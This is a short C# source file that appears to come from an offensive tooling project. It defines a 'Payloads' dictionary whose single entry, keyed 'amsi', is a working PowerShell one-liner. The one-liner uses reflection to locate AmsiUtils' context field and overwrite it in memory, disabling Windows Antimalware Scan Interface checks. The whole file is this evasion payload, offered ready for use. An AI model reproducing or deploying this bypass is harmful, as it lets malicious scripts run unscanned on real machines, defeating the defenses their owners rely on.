using System.Collections.Generic;

namespace Common
{
    // More on http://amsi.fail
    public static class Payloads
    {

        public static Dictionary<string, string> PayloadDict = new Dictionary<string, string>
        {
            {
                "amsi",
                "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"

            }
        };
    }
}
